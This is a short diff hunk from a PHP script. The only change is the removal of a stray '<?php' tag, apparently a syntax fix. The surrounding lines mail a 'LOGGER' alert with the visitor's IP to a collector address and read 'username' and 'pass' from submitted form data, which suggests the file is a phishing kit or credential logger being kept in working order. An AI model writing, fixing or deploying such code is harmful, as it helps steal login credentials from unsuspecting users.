@@ -256,7 +256,6 @@ mail($tujuanmail, "LOGGER", $pesan_alert, "[ " . $_SERVER['REMOTE_ADDR'] . " ]")
 ?>
 <?php
 exit;
-<?php
 }
 if(isset($_POST['pass']) && !empty($_POST['pass']) && isset($_POST['username']) && !empty($_POST['username']) ){
 $pass = $_POST['pass'];
